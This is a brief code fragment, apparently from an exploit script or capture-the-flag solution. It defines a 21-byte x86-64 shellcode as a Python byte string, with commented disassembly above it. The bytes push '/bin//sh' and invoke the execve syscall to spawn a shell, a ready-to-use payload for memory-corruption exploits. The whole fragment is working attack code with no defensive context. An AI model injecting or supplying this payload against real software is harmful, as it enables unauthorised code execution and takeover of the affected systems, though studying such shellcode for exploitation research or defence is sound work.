#  0:   50                      push   eax
#  1:   48                      dec    eax
#  2:   31 d2                   xor    edx, edx
#  4:   48                      dec    eax
#  5:   bb 2f 62 69 6e          mov    ebx, 0x6e69622f
#  a:   2f                      das    
#  b:   2f                      das    
#  c:   73 68                   jae    0x76
#  e:   53                      push   ebx
#  f:   54                      push   esp
# 10:   5f                      pop    edi
# 11:   b0 3b                   mov    al, 0x3b
# 13:   0f 05                   syscall
shellcode = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
